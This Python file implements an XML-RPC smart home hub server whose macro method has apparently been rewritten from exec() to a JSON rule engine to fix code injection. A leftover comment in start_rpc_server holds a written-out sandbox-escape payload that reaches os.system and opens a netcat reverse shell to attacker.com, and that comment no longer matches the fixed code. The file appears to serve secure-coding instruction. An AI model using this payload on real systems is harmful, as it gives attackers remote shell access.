import os
import sqlite3
import logging
from xmlrpc.server import SimpleXMLRPCServer
from xmlrpc.server import SimpleXMLRPCRequestHandler
from datetime import datetime

# Configure logging for the Smart Home RPC Automation Server
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - SmartHomeRPC - %(levelname)s - %(message)s'
)
logger = logging.getLogger("SmartHomeRPC")

DB_FILE = "smart_home_state.db"

def init_hub_db():
    """Initializes the SQLite database for IoT devices."""
    if os.path.exists(DB_FILE):
        return

    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()

    cursor.execute('''
        CREATE TABLE devices (
            device_id TEXT PRIMARY KEY,
            device_type TEXT NOT NULL,
            current_state TEXT NOT NULL,
            last_updated DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')

    mock_devices = [
        ('living_room_light', 'bulb', 'OFF'),
        ('front_door_lock', 'lock', 'LOCKED'),
        ('thermostat_1', 'hvac', '72F')
    ]
    cursor.executemany('''
        INSERT INTO devices (device_id, device_type, current_state)
        VALUES (?, ?, ?)
    ''', mock_devices)

    conn.commit()
    conn.close()
    logger.info("Smart Home device database initialized.")

class RequestHandler(SimpleXMLRPCRequestHandler):
    """Restricts XML-RPC paths to a specific endpoint."""
    rpc_paths = ('/RPC2',)

class SmartHomeAutomationAPI:
    """Exposed XML-RPC API methods for the Smart Home Hub."""
    
    def __init__(self):
        self.db_path = DB_FILE

    def get_device_status(self, device_id: str) -> str:
        """Fetches the current state of a registered device."""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            cursor.execute("SELECT current_state FROM devices WHERE device_id = ?", (device_id,))
            row = cursor.fetchone()
            conn.close()
            if row:
                return row[0]
            return "DEVICE_NOT_FOUND"
        except sqlite3.Error as e:
            logger.error(f"Database error: {e}")
            return "ERROR"

    def update_device_state(self, device_id: str, new_state: str) -> bool:
        """Updates the state of a device (e.g., turning a light on)."""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            cursor.execute('''
                UPDATE devices 
                SET current_state = ?, last_updated = CURRENT_TIMESTAMP 
                WHERE device_id = ?
            ''', (new_state, device_id))
            rows_affected = cursor.rowcount
            conn.commit()
            conn.close()
            return rows_affected > 0
        except sqlite3.Error as e:
            logger.error(f"Database error: {e}")
            return False

    def execute_advanced_macro(self, macro_config_json: str) -> str:
        """
        SECURE: Prevents Code Injection (CWE-94) by replacing arbitrary code 
        execution (exec) with a structured, JSON-based declarative rule engine.
        """
        import json
        
        logger.info("Executing secure smart home automation macro...")
        
        try:
            # Secure: We remove the dangerous exec() function entirely.
            # Executing untrusted strings as Python code on an IoT hub is a critical 
            # vulnerability. Instead, we implement a declarative macro approach where 
            # the client submits a JSON payload defining the actions to take.
            # Note: The client must be updated to send JSON configuration 
            # rather than raw Python scripts.
            
            macro_rules = json.loads(macro_config_json)
            
            if not isinstance(macro_rules, dict):
                logger.warning("Macro configuration must be a valid JSON object.")
                return "MACRO_ERROR: Invalid configuration format."
                
            actions = macro_rules.get("actions", [])
            if not isinstance(actions, list):
                logger.warning("Macro 'actions' must be a list.")
                return "MACRO_ERROR: Actions must be a list."
                
            success_count = 0
            
            # Iterate through the declared actions and execute them using the 
            # existing, safe API methods rather than arbitrary code execution.
            for action in actions:
                if not isinstance(action, dict):
                    continue
                    
                target_device = action.get("device_id")
                desired_state = action.get("state")
                
                if target_device and desired_state:
                    # Safely interact with the database via the predefined method
                    if self.update_device_state(str(target_device), str(desired_state)):
                        success_count += 1
                        logger.info(f"Macro applied: {target_device} -> {desired_state}")
                    else:
                        logger.warning(f"Macro failed to update: {target_device}")
                        
            logger.info(f"Secure macro executed successfully. {success_count} actions applied.")
            return f"SUCCESS: {success_count} actions applied."
            
        except json.JSONDecodeError as e:
            logger.error(f"Failed to parse macro configuration as JSON: {e}")
            return "MACRO_ERROR: Invalid JSON format."
        except Exception as e:
            logger.error(f"Unexpected error executing secure macro: {e}")
            return "MACRO_ERROR: Internal Execution Error"

def start_rpc_server():
    """Starts the XML-RPC server for the Smart Home Hub."""
    init_hub_db()
    
    server = SimpleXMLRPCServer(("0.0.0.0", 9000), requestHandler=RequestHandler, allow_none=True)
    server.register_introspection_functions()
    
    # Register the API instance to expose its methods
    server.register_instance(SmartHomeAutomationAPI())
    
    # Example Malicious Trigger:
    # 1. Attacker writes a short Python script to interact with the XML-RPC server.
    # 2. The payload contains Python code to break out of the empty __builtins__ dictionary:
    #
    #    import xmlrpc.client
    #    proxy = xmlrpc.client.ServerProxy("http://127.0.0.1:9000/RPC2")
    #    malicious_code = "[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('nc -e /bin/sh attacker.com 4444')"
    #    print(proxy.execute_advanced_macro(malicious_code))
    
    logger.info("Starting Smart Home XML-RPC Automation Server on http://0.0.0.0:9000")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        logger.info("Shutting down Smart Home Hub...")

if __name__ == "__main__":
    start_rpc_server()
